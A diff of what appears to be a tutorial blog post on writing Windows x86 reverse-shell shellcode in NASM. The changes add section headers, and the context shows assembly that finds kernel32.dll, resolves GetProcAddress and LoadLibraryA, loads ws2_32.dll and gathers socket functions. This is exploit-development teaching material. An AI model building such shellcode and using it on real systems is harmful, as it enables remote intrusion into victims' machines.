@@ -128,6 +128,9 @@ As you can see, we have a `BOOL` value in our arguments that's set to `TRUE`. Th
 
 ## Assembly Time
 Now the fun part. I'll skip all of the pieces we've already completed over and over. 
+
+### Getting `kernel32.dll` Base Address
+
 ```nasm
 global_start
 
@@ -154,6 +157,8 @@ xor ecx, ecx
 ```
 
 We now have the base address of `kernel32.dll` in ESI as per usual. 
+
+### Getting Address of `GetProcAddress`
 ```nasm
 Get_Function:
  
@@ -176,6 +181,7 @@ add edi, ebx
 
 We now have the address of `GetProcAddress` stored in EDI. One thing to note here is that `GetProcAddress` stores the address of the retrieved function/library inside of EAX. 
 
+### Locating `LoadLibraryA` Address
 ```nasm
 ; use GetProcAddress to find LoadLibraryA
 xor ecx, ecx
@@ -210,6 +216,7 @@ Now, the address of `LoadLibraryA` is stored in EAX.
 
 We can use this function to load the library `ws2_32.dll` into memory. This library holds all of the socket functions we need to establish a reverse shell. 
 
+### Loading `ws2_32.dll` 
 ```nasm
 ; use LoadLibraryA to load the ws2_32.dll
 push 0x61616c6c
@@ -239,6 +246,7 @@ Now is a good time to do a register check, here is what our registers look like 
 ; EDI = GetProcAddress address
 ```
 
+### Locating Our Function Addresses
 Now it's time to go hunting the functions we need: 
 + `WSAStartup`
 + `WSASocketA`
@@ -334,5 +342,6 @@ call edi
 mov [esi + 0x10], eax ; esi at offset 0x10 will now hold the address of ExitProcess
 ```
 
+### Calling Our Functions
 
 
